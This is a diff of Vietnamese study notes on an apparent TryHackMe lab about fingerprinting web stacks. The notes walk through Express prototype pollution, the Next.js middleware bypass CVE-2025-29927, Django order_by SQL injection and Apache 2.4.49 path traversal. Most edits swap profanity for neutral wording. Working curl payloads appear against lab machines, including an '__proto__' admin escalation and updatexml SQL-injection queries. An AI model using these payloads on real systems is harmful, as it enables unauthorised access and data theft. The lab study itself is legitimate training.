@@ -28,13 +28,13 @@ Dấu hiệu cuối cùng cực kỳ chắc chắn là cách server xử lý l�
 > <u>đọc đ hiểu gì, khi nào cần sẽ đọc laij, bây giờ chỉ cần hiểu cái này nó là bước recon để biết xem hệ thống nó có dùng Express hay ko</u>
 ### Khai thác ứng dụng MERN
 #### Hack quyền Admin qua lỗ hổng Prototype Pollution (Cho dễ hiểu)
-Sau khi mày ngửi thấy mùi con server đang chạy Express (port 3000) và có xài session cookie, việc tiếp theo là đi soi mấy cái API của nó. Bọn web xài MERN stack rất hay có trò mở API nhận file JSON để user tự đổi thông tin cá nhân. Để làm được việc này, mấy thằng dev hay tự chế ra các hàm gộp data (gọi là hàm `merge`). Và đm, code ngu ở cái hàm này chính là cái ổ đẻ ra lỗ hổng Prototype Pollution.
+Sau khi mày ngửi thấy mùi con server đang chạy Express (port 3000) và có xài session cookie, việc tiếp theo là đi soi mấy cái API của nó. Bọn web xài MERN stack rất hay có trò mở API nhận file JSON để user tự đổi thông tin cá nhân. Để làm được việc này, mấy thằng dev hay tự chế ra các hàm gộp data (gọi là hàm `merge`). Và việc code sơ hở ở hàm này chính là nguyên nhân đẻ ra lỗ hổng Prototype Pollution.
 
 > [!NOTE]
 > ><u>ok hiểu rồi, tức là lab ở đây tập trung vào việc dev nó viết hàm 'merge data gửi từ api' một cách ngu học</u>
 > 
 
-Nói thẳng luôn: Việc mày gửi data JSON qua phương thức POST đéo có gì sai cả, nó là giao tiếp mạng bình thường.<u> Lỗi là ở cách con server nuốt cục data đó!</u>
+Nói thẳng luôn: Việc mày gửi data JSON qua phương thức POST không có gì sai cả, nó là giao tiếp mạng bình thường.<u> Lỗi là ở cách con server nuốt cục data đó!</u>
 **Con web này có 2 cái API nhạy cảm:**
    * **`POST /api/user/update`**: Hứng cục JSON mày gửi lên, rồi gộp thẳng vào data tài khoản hiện tại của mày.
    * **`GET /api/admin/flag`**: Trả về cái cờ (flag) nếu nó check thấy mày có quyền admin.
@@ -42,21 +42,21 @@ Nói thẳng luôn: Việc mày gửi data JSON qua phương thức POST đéo c
 > [!NOTE]
 > > trước tiên cần hiểu tml api là cái gì đã [[API]]
 
-Bình thường, mày lấy cái acc quèn gọi thẳng vào API lấy cờ thì nó chửi thẳng mặt `{"error":"Not authorized"}` ngay, vì trong data tài khoản của mày làm đéo có cái thuộc tính `isAdmin`.
+Bình thường, mày lấy cái acc quèn gọi thẳng vào API lấy cờ thì nó chửi thẳng mặt `{"error":"Not authorized"}` ngay, vì trong data tài khoản của mày làm gì có thuộc tính `isAdmin`.
 ![[Pasted image 20260816205436.png]]
-Nhưng sang cái API update,<u> mày sẽ thấy thằng dev code cực ẩu</u>. <u>Mày gửi cái mả mẹ gì lên (tên, tuổi, email...), nó cũng nhận hết và nhét thẳng vào tài khoản mày mà đéo thèm rào trước đón sau.</u>
+Nhưng sang cái API update,<u> mày sẽ thấy thằng dev code cực ẩu</u>. <u>Mày gửi bất cứ thứ gì lên (tên, tuổi, email...), nó cũng nhận hết và nhét thẳng vào tài khoản mày mà không hề rào trước đón sau.</u>
 
 **Đòn chí mạng của JavaScript:**
-Trong JS, object đéo nào cũng có một cái gốc chung gọi là `Object.prototype`. Khi cái hàm `merge` nhận được cục payload mày gửi có chứa cái từ khóa ma giáo `__proto__` (ví dụ: `{"__proto__": {"isAdmin": true}}`), thay vì update cho tài khoản của mày, nó lại vô tình ghi đè mẹ cái quyền `isAdmin` vào cái gốc `Object.prototype`.
+Trong JS, object nào cũng có một cái gốc chung gọi là `Object.prototype`. Khi cái hàm `merge` nhận được cục payload mày gửi có chứa cái từ khóa ma giáo `__proto__` (ví dụ: `{"__proto__": {"isAdmin": true}}`), thay vì update cho tài khoản của mày, nó lại vô tình ghi đè quyền `isAdmin` vào cái gốc `Object.prototype`.
 
 ```shell-session
 root@tryhackme:~# curl -b cookies.txt -X POST http://10.49.132.56:3000/api/user/update -H "Content-Type: application/json" -d '{"__proto__": {"isAdmin": true}}'
 {"status":"updated"}
 ```
-Hậu quả vãi lồn: Từ giây phút đó, BẤT KỲ tài khoản đéo nào đang chạy trên con server đó cũng auto được dính cái quyền `isAdmin = true` này.
+Hậu quả nghiêm trọng: Từ giây phút đó, BẤT KỲ tài khoản nào đang chạy trên con server đó cũng auto được dính quyền `isAdmin = true` này.
 ><u>đọc cái trên để hiểu cái thuộc tính __proto__ nó là thuộc tính chung của tất cả các object của js</u>
 #### Quá trình hốc cờ thực tế
-Nhìn cái hàm `merge` óc chó này đi:
+Nhìn cái hàm `merge` sơ hở này đi:
 
 ```javascript
 function merge(target, source) {
@@ -73,8 +73,8 @@ function merge(target, source) {
 
 ```
 
-Khi cục payload chứa chữ `__proto__` lọt vào vòng lặp, biến `target["__proto__"]` đéo trỏ vào tài khoản của mày nữa, mà nó chọc thủng đáy, trỏ thẳng xuống `Object.prototype` của toàn bộ hệ thống NodeJS. Thế là dòng lệnh tiếp theo nó tiêm thẳng cái `isAdmin = true` vào lõi server.
-> <u>ok hiểu sương sương target là object bên phía server, còn source là do người dùng gửi lên.hàm trên nó viết óc chó, nó gộp thuộc tính của soure, với target mà đ cần biết cái thuộc tính của source nó là cái gì, ngay cả khi truyền vào thuộc tính `__proto__`</u>
+Khi cục payload chứa chữ `__proto__` lọt vào vòng lặp, biến `target["__proto__"]` không trỏ vào tài khoản của mày nữa, mà nó chọc thủng đáy, trỏ thẳng xuống `Object.prototype` của toàn bộ hệ thống NodeJS. Thế là dòng lệnh tiếp theo nó tiêm thẳng cái `isAdmin = true` vào lõi server.
+> <u>ok hiểu sương sương target là object bên phía server, còn source là do người dùng gửi lên. Hàm trên viết sơ hở, nó gộp thuộc tính của source với target mà không cần biết thuộc tính của source là cái gì, ngay cả khi truyền vào thuộc tính `__proto__`</u>
 
 **Lúc này ở API lấy cờ:**
 ```javascript
@@ -86,20 +86,20 @@ app.get('/api/admin/flag', (req, res) => {
 
 ```
 
-Mặc dù cái tài khoản `currentUser` của mày bản chất vẫn rỗng tuếch, nhưng khi hệ thống chạy đến dòng check `currentUser.isAdmin`, thằng JS tìm đéo thấy nên tự động tụt đường ống chạy xuống cái gốc (prototype chain) để tìm tiếp. Bùm! Nó bốc ngay được cái chữ `true` mà mày vừa cấy vào hệ thống lúc nãy.
+Mặc dù cái tài khoản `currentUser` của mày bản chất vẫn rỗng tuếch, nhưng khi hệ thống chạy đến dòng check `currentUser.isAdmin`, thằng JS tìm không thấy nên tự động chạy xuống cái gốc (prototype chain) để tìm tiếp. Bùm! Nó bốc ngay được cái chữ `true` mà mày vừa cấy vào hệ thống lúc nãy.
 
 Thế là mày qua mặt được vòng kiểm duyệt nhẹ như lông hồng và server ói cái cờ ra cho mày bú.
 
 > [!NOTE]
-> ok t hiểu sương sương r, nói chung là cái object cặc nào cũng có cái prototype, nó là cái thuộc tính ẩn đúngko, khi truy vấn tới 1 thuộc tính mà đéo có, nó sẽ đâm xuống tml thuộc tính prototype ý gì
+> ok t hiểu sương sương rồi, nói chung là cái object nào cũng có prototype, nó là thuộc tính ẩn đúng không, khi truy vấn tới 1 thuộc tính mà không có, nó sẽ tra xuống thuộc tính prototype ý gì
 
 # 3- REACT /NextJS
-Thằng Express là nền móng của cái stack MERN mà tao với mày vừa giã xong. <u>Thằng Next.js được build đè lên nó,</u> nhét thêm mấy trò như *App Router*, *React Server Components* (RSC) với *middleware*. Chính mấy món đồ chơi này tự nhiên tạo ra một cái bề mặt tấn công to vãi l và nguy hiểm hơn nhiều.
+Thằng Express là nền móng của cái stack MERN mà tao với mày vừa giã xong. <u>Thằng Next.js được build đè lên nó,</u> nhét thêm mấy trò như *App Router*, *React Server Components* (RSC) với *middleware*. Chính các tính năng này tạo ra một bề mặt tấn công rộng và nguy hiểm hơn nhiều.
 ### Nhận diện bộ công nghệ (Stack Identity)
 
-Next.js giờ là trùm mẹ nó rồi trong mảng React production. Mấy cái web dashboard xịn xò hay portal khách hàng 3 năm đổ lại đây toàn xài nó. Trên Ubuntu, nó chạy như một tiến trình Node.js dưới quyền một user riêng (kiểu node hoặc www-data), thường được bật bằng lệnh npm start sau khi đã gõ npm run build. Cái App Router (có từ bản 13, mặc định từ bản 14) chính là thằng mở đường cho 2 con hàng CVE-2025-29927 và CVE-2025-55182.
+Next.js giờ là hàng đầu trong mảng React production. Mấy cái web dashboard xịn xò hay portal khách hàng 3 năm đổ lại đây toàn xài nó. Trên Ubuntu, nó chạy như một tiến trình Node.js dưới quyền một user riêng (kiểu node hoặc www-data), thường được bật bằng lệnh npm start sau khi đã gõ npm run build. Cái App Router (có từ bản 13, mặc định từ bản 14) chính là thằng mở đường cho 2 con hàng CVE-2025-29927 và CVE-2025-55182.
 
-Lưu ý: 2 con CVE này chỉ dính khi app chạy ở mode production (npm run build && npm start) thôi nhé. Ở mode dev (next dev) thì đéo dính đâu. Nếu lúc trinh sát mày thấy nó đang chạy server dev thì vứt, 2 con CVE này phế.
+Lưu ý: 2 con CVE này chỉ dính khi app chạy ở mode production (npm run build && npm start) thôi nhé. Ở mode dev (next dev) thì không dính đâu. Nếu lúc trinh sát mày thấy nó đang chạy server dev thì 2 con CVE này không áp dụng được.
 
 #### React Server Components và Giao thức Flight
 
@@ -138,7 +138,7 @@ Xong thì soi mấy cái dấu hiệu này:
 * Header của Middleware: x-middleware-next hoặc x-middleware-rewrite (Độ tin cậy trung bình)
 * Bị đá văng (Redirect 307) về trang /login (Độ tin cậy trung bình)
 
-Cái `window.__next_f` trong source code là bằng chứng rõ nhất của App Router. Nó là cái mảng data của React Server Component do thằng Next.js tự động tiêm vào mọi trang HTML. Bọn Pages Router hay mấy framework khác đéo bao giờ có cái chữ này.
+Cái `window.__next_f` trong source code là bằng chứng rõ nhất của App Router. Nó là cái mảng data của React Server Component do thằng Next.js tự động tiêm vào mọi trang HTML. Bọn Pages Router hay mấy framework khác không bao giờ có chữ này.
 
 ### CVE-2025-29927: Bypass cái Middleware
 
@@ -147,7 +147,7 @@ Trong Next.js, <u>middleware là cái hàm chạy chặn đầu mọi request tr
 > [!NOTE]
 > ><u>-ok middle ware cứ hiểu như lớp lọc request</u>
 
-Đường dẫn /dashboard trong cái app này là ví dụ chuẩn cmnl. Middleware check xem mày có session cookie xịn không. Đéo có là nó sút mày về /login. Test thử xem nó có đang chặn không:
+Đường dẫn /dashboard trong cái app này là ví dụ chuẩn luôn. Middleware check xem mày có session cookie xịn không. Không có là nó chuyển hướng mày về /login. Test thử xem nó có đang chặn không:
 
 ```shell
 root@tryhackme:~# curl -v http://MACHINE_IP:3001/dashboard
@@ -160,16 +160,16 @@ Accept: /
 
 ```
 
-Đấy, middleware hoạt động ngon. Đéo có cookie thì đéo có dashboard, bị sút thẳng về /login.*=> ok hiểu*
+Đấy, middleware hoạt động ngon. Không có cookie thì không vào được dashboard, bị chuyển hướng thẳng về /login.*=> ok hiểu*
 
-Giờ đến đoạn hack. Next.js nó xài một cái internal header tên là *x-middleware-subrequest* để chống vụ lặp vô hạn. Kh<u>i middleware tự gọi chính nó (kiểu forward request tới đường dẫn khác), Next.js tự nhét cái header này vào để báo hiệu "ê đéo chạy middleware cho cái request này nữa nhé".</u> Bản chất nó là cơ chế tối ưu và an toàn của hệ thống thôi.
+Giờ đến đoạn hack. Next.js nó xài một cái internal header tên là *x-middleware-subrequest* để chống vụ lặp vô hạn. Kh<u>i middleware tự gọi chính nó (kiểu forward request tới đường dẫn khác), Next.js tự nhét cái header này vào để báo hiệu "không chạy middleware cho cái request này nữa nhé".</u> Bản chất nó là cơ chế tối ưu và an toàn của hệ thống thôi.
 
 > [!NOTE]
 > -ok hiểu cái x-middleware-subrequest này để làm gì
 > -ok t hiểu luôn là cái header này nó nằm ở request và nó được backend nhét vô request để ko chạy middleware cho cái request này
-> -ok nhé, hiểu cmn là middle ware là thằng bảo vệ check mấy cái cookie, authentication của mấy bọn request đi vào hệ thống, nhưng mà có một lỗi óc chó là, request cứ chứa cái header củ l kia thì nó sẽ ko check nữa, mà cái header trên thì người dùng có thể gán được mới đau, cứ nhìn cái payload bên dưới là hiểu
+> -ok nhé, hiểu là middleware là thành phần bảo vệ check cookie, authentication của các request đi vào hệ thống, nhưng mà có một lỗi sơ hở là, request cứ chứa cái header kia thì nó sẽ ko check nữa, mà cái header trên thì người dùng có thể tự gán được, cứ nhìn cái payload bên dưới là hiểu
 
-<u>Lỗi ngu học nằm ở đây: Thằng Next.js đéo bao giờ check xem cái header x-middleware-subrequest này là do server nội bộ tự tạo hay do thằng ất ơ nào bên ngoài tự gửi vào.</u> Mày chỉ cần tự nhét cái header này vào request của mày, Next.js bị lừa tưởng đó là subrequest nội bộ và bỏ qua luôn bước chạy middleware. Thế là khâu check quyền coi như vứt sọt rác.
+<u>Lỗi nằm ở đây: Thằng Next.js không hề check xem header x-middleware-subrequest này là do server nội bộ tự tạo hay do người ngoài tự gửi vào.</u> Mày chỉ cần tự nhét cái header này vào request của mày, Next.js bị lừa tưởng đó là subrequest nội bộ và bỏ qua luôn bước chạy middleware. Thế là khâu check quyền coi như vứt sọt rác.
 
 Cái giá trị của header này chính là đường dẫn của file middleware viết lặp lại 5 lần. Ví dụ file middleware.ts nằm ở thư mục gốc thì viết như này:
 
@@ -185,30 +185,30 @@ Flag: [REDACTED]
 > [!NOTE]
 > <u>ok kết quả trả về, tao có thể thấy thằng dashboard hiện lên, bỏ qua khâu login, nhưng t vẫn chưa hiểu rõ lắm cái cơ chế bypass?</u>![[Pasted image 20260816202936.png]]
 
-Xong cmn việc. Bypass toàn bộ middleware. <u>Request đi thẳng mẹ nó vào page dashboard và móc được flag ra dễ như ăn kẹo.</u>
+Xong việc. Bypass toàn bộ middleware. <u>Request đi thẳng vào page dashboard và lấy được flag ra dễ như ăn kẹo.</u>
 
-Đấy chính là CVE-2025-29927, điểm CVSS 9.1 Critical đấy. Mọi con app Next.js xài middleware để chặn quyền đều bị bypass tanh bành chỉ bằng một cái header. Đéo cần tài khoản, đéo cần brute force hay session token cái lồn gì sất, chỉ cần một cái giá trị header mà Next.js nó tin tưởng mù quáng là ăn.
+Đấy chính là CVE-2025-29927, điểm CVSS 9.1 Critical đấy. Mọi con app Next.js xài middleware để chặn quyền đều bị bypass tanh bành chỉ bằng một cái header. Không cần tài khoản, không cần brute force hay session token gì cả, chỉ cần một giá trị header mà Next.js tin tưởng mù quáng là xong.
 
 Lưu ý: Nếu app nó xài cấu trúc thư mục /src, thì cái giá trị header phải đổi thành src/middleware lặp lại 5 lần. Nhớ check kỹ xem file nó nằm ở gốc hay trong /src nhé.
 
 ### CVE-2025-55182: Đâm RCE trong Room riêng
 
-Con CVE-2025-55182 này là lỗi RCE (chạy lệnh từ xa) đéo cần xác thực thông qua lỗ hổng insecure deserialization trong cái bộ phân tích giao thức RSC Flight. Nó dính trên Next.js 14 và 15.x đi kèm React 19, điểm CVSS 10.0 Critical kịch trần cmnl. Bọn Jackpot Panda đã xài trò này để đi từ lệnh whoami lên tới trộm thông tin và cắm Cobalt Strike cùng đợt với con CVE-2025-29927 luôn.
+Con CVE-2025-55182 này là lỗi RCE (chạy lệnh từ xa) không cần xác thực thông qua lỗ hổng insecure deserialization trong bộ phân tích giao thức RSC Flight. Nó dính trên Next.js 14 và 15.x đi kèm React 19, điểm CVSS 10.0 Critical tuyệt đối. Bọn Jackpot Panda đã xài trò này để đi từ lệnh whoami lên tới trộm thông tin và cắm Cobalt Strike cùng đợt với con CVE-2025-29927 luôn.
 
-Có hẳn một cái room TryHackMe riêng để hướng dẫn mổ xẻ payload và cách detect: [CVE-2025-55182: React2Shell](https://tryhackme.com/room/react2shellcve202555182). Cái room đó sẽ nói sâu hơn về vụ deserialization của Flight protocol, dắt tay mày khai thác từ lúc rà quét đến lúc chạy lệnh ăn RCE. Bài hiện tại này tao chỉ tập trung vào vụ trinh sát fingerprinting thôi nên tao đéo nói sâu phần đó. Đọc kỹ đi rồi thực hành cho nó trôi.*=>ok bố hiểu r*
+Có hẳn một cái room TryHackMe riêng để hướng dẫn mổ xẻ payload và cách detect: [CVE-2025-55182: React2Shell](https://tryhackme.com/room/react2shellcve202555182). Cái room đó sẽ nói sâu hơn về vụ deserialization của Flight protocol, dắt tay mày khai thác từ lúc rà quét đến lúc chạy lệnh ăn RCE. Bài hiện tại này tao chỉ tập trung vào vụ trinh sát fingerprinting thôi nên tao không nói sâu phần đó. Đọc kỹ đi rồi thực hành cho nó trôi.*=>ok hiểu rồi*
 
 # 4-Django
 
-Đm nghe tao thông não con hàng Django này nhé. Bê nguyên code của mày đéo sai một dấu phẩy nào. Đọc cho kỹ:
+Nghe tao phân tích con hàng Django này nhé. Bê nguyên code của mày không sai một dấu phẩy nào. Đọc cho kỹ:
 
 Mấy cái stack Express với Next.js tao với mày vừa giã toàn chạy trên nền Node.js. Giờ sang thằng Django, con hàng này là framework thuần Python mà bọn nhà nước, tòa soạn báo, hay mấy công ty có team dev Python cực kỳ khoái xài.
 
-Bản chất thằng Django có một cái cục **ORM** (Object-Relational Mapping), đáng lẽ sinh ra để làm cái khiên chắn mẹ hết mấy đòn SQL Injection. Đa số là nó đỡ được. Nhưng đm, cái dở là khi mấy thằng dev ngáo đá thích đi tắt đón đầu, vứt mẹ cái ORM đi rồi nối chuỗi thẳng cái input của user vào câu lệnh SQL, hoặc bản thân cái ORM dính lỗi ở mấy đoạn code cũ nát, thì cái database coi như banh lồn, mở toang cửa cho anh em mình vào.
-Con **CVE-2021-35042** chính là một cái lỗi SQL Injection như thế ở trong hàm query `order_by()` của Django. Nó được đánh giá CVSS 9.8 Critical (cực kỳ nghiêm trọng) và vãi lồn nhất là đéo cần tài khoản đăng nhập cũng quất được.
+Bản chất thằng Django có thành phần **ORM** (Object-Relational Mapping), đáng lẽ sinh ra để làm cái khiên chắn hầu hết mấy đòn SQL Injection. Đa số là nó đỡ được. Nhưng cái dở là khi dev thích đi tắt đón đầu, bỏ qua ORM rồi nối chuỗi thẳng cái input của user vào câu lệnh SQL, hoặc bản thân cái ORM dính lỗi ở mấy đoạn code cũ, thì database coi như toang, mở toang cửa cho kẻ tấn công xâm nhập.
+Con **CVE-2021-35042** chính là một cái lỗi SQL Injection như thế ở trong hàm query `order_by()` của Django. Nó được đánh giá CVSS 9.8 Critical (cực kỳ nghiêm trọng) và điểm đáng chú ý nhất là không cần tài khoản đăng nhập cũng khai thác được.
 
 ### Nhận diện hệ thống (Stack Identity)
 
-Thằng Django này đang gánh một lượng lớn các app web viết bằng Python. Trên Ubuntu, nó hay chạy núp bóng Gunicorn hoặc cái server dev build sẵn của nó, thường cắm cờ ở port 8000. Cái trang quản trị admin ở đường dẫn `/admin/` với cái trò CSRF middleware gần như đéo bao giờ tắt ở mọi project Django. Chỉ cần soi thấy cái trang admin thôi là đủ tín hiệu chốt kèo rồi, chưa cần ném payload vội.
+Thằng Django này đang gánh một lượng lớn các app web viết bằng Python. Trên Ubuntu, nó hay chạy núp bóng Gunicorn hoặc cái server dev build sẵn của nó, thường cắm cờ ở port 8000. Cái trang quản trị admin ở đường dẫn `/admin/` với cái trò CSRF middleware gần như không bao giờ tắt ở mọi project Django. Chỉ cần soi thấy cái trang admin thôi là đủ tín hiệu chốt kèo rồi, chưa cần ném payload vội.
 
 > [!NOTE]
 > > <u>tao chưa hiểu phần này</u>
@@ -241,8 +241,8 @@ Chạy xong thì soi kỹ mấy cái dấu hiệu này:
 * **Header Referrer-Policy**: `same-origin` (Độ tin cậy: Trung bình)
 * **Source HTML (ở mấy cái form POST)**: trường ẩn chứa `csrfmiddlewaretoken` (Độ tin cậy: Cực cao)
 
-Cái trường ẩn `csrfmiddlewaretoken` là cái dấu vân tay uy tín nhất của thằng Django. Cái `CsrfViewMiddleware` của nó tự động bơm cái trường này vào mọi form POST. Mày cứ mò vào trang `/admin/` rồi view source kiểu đéo gì cũng thấy. Bọn Express, Rails hay Next.js đéo bao giờ có cái này.
-Thêm nữa, cái combo 3 header `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, và `Referrer-Policy: same-origin` đi cùng nhau là dấu hiệu rõ ràng của `SecurityMiddleware` bên Django. Đéo có framework nào khác mặc định gộp combo này.
+Cái trường ẩn `csrfmiddlewaretoken` là cái dấu vân tay uy tín nhất của thằng Django. Cái `CsrfViewMiddleware` của nó tự động bơm cái trường này vào mọi form POST. Mày cứ mò vào trang `/admin/` rồi view source kiểu gì cũng thấy. Bọn Express, Rails hay Next.js không bao giờ có cái này.
+Thêm nữa, cái combo 3 header `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, và `Referrer-Policy: same-origin` đi cùng nhau là dấu hiệu rõ ràng của `SecurityMiddleware` bên Django. Không có framework nào khác mặc định gộp combo này.
 
 > [!NOTE]
 > <u>nói chung là cứ recon bằng cacsh xem header, bí quá thfi ném vào AI nó detect cho</u>
@@ -290,7 +290,7 @@ sql = (
 
 ```
 
-Mày nhét cái lồn gì vào `?order=` thì nó cũng hạ cánh thẳng vào cái nhánh `THEN` của câu SQL mà đéo có một màng lọc nào hết. Cái cấu trúc `CASE WHEN` này lúc đéo nào cũng đúng (`1=1`), nên cái nhánh `THEN` chắc chắn sẽ chạy. Thế là chết cụ mày rồi.
+Mày nhét bất cứ giá trị nào vào `?order=` thì nó cũng đi thẳng vào nhánh `THEN` của câu SQL mà không có một màng lọc nào hết. Cái cấu trúc `CASE WHEN` này lúc nào cũng đúng (`1=1`), nên nhánh `THEN` chắc chắn sẽ chạy. Thế là hệ thống bị khai thác rồi.
 
 Kỹ thuật `updatexml()` khai thác cách thằng MySQL nôn ra lỗi XPath. Cái lệnh `updatexml(1, xpath_expr, 1)` sẽ báo lỗi nếu cái biểu thức XPath sai cấu trúc. Bằng cách bọc một câu `SELECT` vào trong tham số XPath cùng với cái hàm `concat(0x7e, ...)`, <u>thằng MySQL sẽ ói luôn kết quả truy vấn ra trong cái thông báo lỗi.</u> Cái mã `0x7e` chuyển ra chính là dấu `~`, đóng vai trò như một cái cọc tiêu để anh em mình nhìn vào là nhận ra ngay đoạn data cần bốc.
 Khi con Django đang bật chế độ debug (`DEBUG = True`), nó sẽ hớ hênh phun hết mớ báo lỗi MySQL này vào cái giao diện lỗi HTTP 500.
@@ -298,12 +298,12 @@ Khi con Django đang bật chế độ debug (`DEBUG = True`), nó sẽ hớ hê
 > [!NOTE]
 > <u> nói chung là cần bật debug mới được, cái này thuàn lab, mà tao cũng chưa hiểu cái updatexml là cái l j</u>
 
-> **CẢNH BÁO:** Cái trò `updatexml()` này chỉ bú được khi file `settings.py` đang set `DEBUG = True`. Gặp mấy con app thực tế production nó gạt về `DEBUG = False` thì nó chỉ quăng ra cái trang báo lỗi 500 chung chung đéo có detail gì cả. Trong bài lab này thì debug đang bật, nhưng đi làm thực tế thì phải check kỹ cái này trước. Nếu nó tắt output lỗi thì phải chuyển qua xài Blind SQL Injection bằng thời gian (dùng lệnh `SLEEP()`).
+> **CẢNH BÁO:** Kỹ thuật `updatexml()` này chỉ khai thác được khi file `settings.py` đang set `DEBUG = True`. Gặp mấy con app thực tế production gạt về `DEBUG = False` thì nó chỉ trả về trang báo lỗi 500 chung chung không có detail gì cả. Trong bài lab này thì debug đang bật, nhưng đi làm thực tế thì phải check kỹ cái này trước. Nếu nó tắt output lỗi thì phải chuyển qua xài Blind SQL Injection bằng thời gian (dùng lệnh `SLEEP()`).
 
 #### Thực hành cướp cờ (Exploitation Walkthrough)
 
 **Bước 1: Móc phiên bản MySQL**
-Check xem đường đạn đi có chuẩn không bằng cách moi một cái giá trị cố định: phiên bản database. Cái biến hệ thống `@@version` lúc đéo nào cũng có sẵn và nó báo cho mày biết là payload của mày có chạy hay không. Cái trang lỗi 500 tiện thể nôn luôn cả phiên bản Django ra:
+Check xem đường đạn đi có chuẩn không bằng cách moi một cái giá trị cố định: phiên bản database. Cái biến hệ thống `@@version` lúc nào cũng có sẵn và nó báo cho mày biết là payload của mày có chạy hay không. Cái trang lỗi 500 tiện thể nôn luôn cả phiên bản Django ra:
 
 ```bash
 root@ip-10-82-126-238:~# curl -s "http://10.49.132.56:8000/products/?order=updatexml(1,concat(0x7e,(select%20@@version)),1)" | grep -o '~[0-9][^&]*'
@@ -339,7 +339,7 @@ $\rightarrow$ **`vuln_db`**
 
 # 5-LAMP
 
-(LAMP, MySQL, PHP) là một trong những cái web stack đời đầu và phổ biến mẹ nó nhất. Tụi nó xài nhiều vì toàn đồ open-source, ổn định và dễ cài. Linux làm hệ điều hành, <u>Apache gác cổng hứng web request</u>, <u>MySQL giữ database</u>, còn <u>PHP thì lo xử lý logic</u>. Bao nhiêu năm nay nó gánh còng lưng cái internet này, từ blog, forum đến app doanh nghiệp. <u>Kể cả bây giờ, đầy hệ thống cũ hoặc server thật vẫn ôm cái đống LAMP này vì nó lì đòn và dễ dùng</u>.
+(LAMP, MySQL, PHP) là một trong những cái web stack đời đầu và phổ biến bậc nhất. Tụi nó xài nhiều vì toàn đồ open-source, ổn định và dễ cài. Linux làm hệ điều hành, <u>Apache gác cổng hứng web request</u>, <u>MySQL giữ database</u>, còn <u>PHP thì lo xử lý logic</u>. Bao nhiêu năm nay nó gánh còng lưng cái internet này, từ blog, forum đến app doanh nghiệp. <u>Kể cả bây giờ, đầy hệ thống cũ hoặc server thật vẫn ôm cái đống LAMP này vì nó lì đòn và dễ dùng</u>.
 
 > [!NOTE]
 > ><u>-LAM là viết tắt cho linux , apcahe , mysql,php</u>
@@ -353,7 +353,7 @@ Trên con Ubuntu,<u> thằng Apache thường chạy ngầm dưới quyền user
 > 
 
 #### Trinh sát hệ thống LAMP (Fingerprinting)
-Đầu tiên là bài check header. Thằng Apache có cái tật rất ngứa háng là lúc đéo nào cũng bô bô cái phiên bản của nó ra trong mọi phản hồi:
+Đầu tiên là bài check header. Thằng Apache có đặc điểm là lúc nào cũng để lộ phiên bản của nó ra trong các phản hồi:
 
 ```text
 root@tryhackme:~# curl -I http://MACHINE_IP:8080/
@@ -367,7 +367,7 @@ Content-Type: text/html
 
 ```
 
-Thấy cái dòng `Server: Apache/2.4.49 (Unix)` không? Thế là quá đủ cho một cuộc tình. Đúng cái phiên bản chết tiệt này khớp khít lỗ đít với con hàng **CVE-2021-41773** chứ đéo lệch đi đâu được. Thằng Apache còn ngu tới mức lặp lại cái phiên bản này ở dưới đáy cái trang lỗi 404. Mày cứ thử gọi đại một cái đường dẫn đéo tồn tại xem nó nôn ra không:
+Thấy cái dòng `Server: Apache/2.4.49 (Unix)` không? Thế là quá đủ thông tin rồi. Đúng cái phiên bản này khớp hoàn toàn với lỗ hổng **CVE-2021-41773** không lệch đi đâu được. Thằng Apache còn lặp lại phiên bản này ở dưới đáy của trang lỗi 404. Mày cứ thử gọi đại một đường dẫn không tồn tại xem nó hiện ra không:
 
 > [!question]
 > <u>-lúc đ nào cũng phải check header để nhận biết mấy cái webstack đang được dùng nhỉ?</u>
@@ -400,7 +400,7 @@ root@tryhackme:~# curl -v http://MACHINE_IP:8080/nonexistent 2>&1
 
 ```
 
-Cái tín hiệu chốt hạ là thư mục `/cgi-bin/`. Nếu nó chửi `403 Forbidden` thì nghĩa là cái thư mục đó có tồn tại, chỉ là nó cấm mày xem danh sách file bên trong thôi, tức là `mod_cgi` đã được cấu hình. Còn nếu nó chửi `404` thì là đéo có gì hết. Để ăn được quả exploit này, bắt buộc phải có mặt thằng `mod_cgi`:
+Cái tín hiệu chốt hạ là thư mục `/cgi-bin/`. Nếu nó chửi `403 Forbidden` thì nghĩa là cái thư mục đó có tồn tại, chỉ là nó cấm mày xem danh sách file bên trong thôi, tức là `mod_cgi` đã được cấu hình. Còn nếu nó trả về `404` thì là không có gì hết. Để ăn được quả exploit này, bắt buộc phải có mặt thằng `mod_cgi`:
 
 ```python
 root@tryhackme:~# curl -v http://MACHINE_IP:8080/cgi-bin/ 2>&1
@@ -437,36 +437,36 @@ root@tryhackme:~# curl -v http://MACHINE_IP:8080/cgi-bin/ 2>&1
 Xong xuôi thì check mấy cái dấu hiệu này:
 * **Header Server**: `Apache/2.4.49 (Unix)` (Độ tin cậy: Kịch trần - Khớp đúng con CVE).
 * **Đáy trang lỗi 404**: Lòi ra chuỗi phiên bản `Apache/2.4.49` (Độ tin cậy: Kịch trần).
-* **Phản hồi từ `/cgi-bin/**`: Báo `403 Forbidden` chứ đéo phải 404 (Độ tin cậy: Cao - Xác nhận mod_cgi đang bật).
+* **Phản hồi từ `/cgi-bin/**`: Báo `403 Forbidden` chứ không phải 404 (Độ tin cậy: Cao - Xác nhận mod_cgi đang bật).
 
 ### Lỗ hổng CVE-2021-41773
 
-Lên bản 2.4.49, bọn dev Apache táy máy sửa mẹ cái hàm `ap_normalize_path()`. Cái trò sửa ngu này vô tình làm hỏng cmn cái màng lọc chống Path Traversal (lội ngược thư mục). Bình thường, Apache nó sẽ chặn họng bất kỳ cái URL nào có chứa `../` trước khi cho chạm vào hệ thống file. Lỗi ở đây là thứ tự giải mã (decode) bị ngu: nó cho cái màng lọc chạy mẹ nó trước khi URL được giải mã hoàn toàn.
+Lên bản 2.4.49, dev Apache sửa hàm `ap_normalize_path()`. Việc sửa đổi này vô tình làm hỏng cơ chế lọc chống Path Traversal (lội ngược thư mục). Bình thường, Apache sẽ chặn bất kỳ URL nào có chứa `../` trước khi cho chạm vào hệ thống file. Lỗi ở đây là thứ tự giải mã (decode) bị sai sót: nó cho cơ chế lọc chạy trước khi URL được giải mã hoàn toàn.
 
